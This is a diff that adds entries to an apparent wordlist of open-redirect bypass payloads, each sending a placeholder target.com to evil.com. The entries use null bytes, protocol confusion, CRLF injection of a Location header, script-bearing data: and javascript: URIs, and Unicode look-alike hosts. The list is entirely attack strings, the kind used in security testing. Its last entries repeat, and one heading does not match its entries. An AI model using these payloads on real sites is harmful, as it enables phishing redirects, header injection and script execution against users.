@@ -14,3 +14,30 @@ https://evil.com@target.com
 ////evil.com/%2f%2e%2e
 https://evil.com#@target.com
 https://evil.com?@target.com
+# Null byte / whitespace bypasses
+https://evil.com%00
+https://evil.com%00.target.com
+https://evil.com%09
+https://evil.com%0a
+https://evil.com%0d
+# Protocol confusion
+https:evil.com
+http:///evil.com
+//evil.com/%2f..
+///\evil.com
+# CRLF injection
+%0d%0aLocation:%20https://evil.com
+%0aLocation:%20https://evil.com
+# data: and javascript: URIs
+data:text/html,<script>window.location='https://evil.com'</script>
+javascript:window.location='https://evil.com'
+# Subdomain/dot confusion
+https://target.evil.com
+https://target%2eevil.com
+https://evil。com
+# Fullwidth characters
+https://ｅｖｉｌ.ｃｏｍ
+# Unicode normalization
+https://evil.com\@target.com
+https://evil.com/.
+https://evil.com/.
